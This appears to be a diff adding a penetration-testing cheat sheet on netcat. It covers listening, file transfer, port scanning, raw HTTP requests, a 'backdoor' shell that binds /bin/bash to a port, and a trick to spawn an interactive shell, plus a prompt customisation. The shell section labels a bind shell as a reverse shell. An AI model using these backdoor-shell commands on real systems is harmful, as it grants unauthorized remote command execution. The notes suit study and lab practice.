@@ -1,0 +1,98 @@
+Netcat:
+```````
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+1. To start listening on a port:
+--------------------------------
+
+MAchine 1:
+
+# nc -l -p 8080 -v
+
+Machine 2:
+
+# nc machine1_IP 8080 -v
+
+
+
+2. To transfer data
+-------------------
+
+Terminal 1:
+
+# nc -lvp 8080 < data.txt
+
+Terminal 2:
+
+# nc 127.0.0.1 8080 -v > collect.txt
+
+
+
+
+3. To perform Port Scanning:
+----------------------------
+
+# nc -z -v 127.0.0.1 80
+# nc -z -v 127.0.0.1 80 443
+# nc -z -v 127.0.0.1 80-100
+
+
+4. To send an HTTP Request:
+---------------------------
+
+# nc demo2server.in 80
+GET /robots.txt HTTP/1.1
+Host: demo2server.in
+
+
+
+
+
+5. Launching Reverse (Backdoor) Shells:
+---------------------------------------
+
+Terminal 1:
+
+# nc -n -v -lp 5555 -e /bin/bash
+
+Terminal 2:
+
+# nc -nv 127.0.0.1 5555
+
+6. connection to UDP:
+---------------------
+
+Terminal 1:
+
+# nc -u -lvp 53
+_____________________________________________________
+Spawn an interactive shell:
+```````````````````````````
+script -qc /bin/sh /dev/null
+	OR
+script -qc /bin/bash /dev/null
+
+bash$
+OR
+sh$
+
+PS1='\[\e[36m\]\u\[\e[m\]@\[\e[32m\]\h:\[\e[33;1m\]\w \[\e[0;31m\]\$\[\e[m\] '
+
+\u : username
+@
+\h : hostname
+\w : Full path 
+\$ : If root then # else $
+
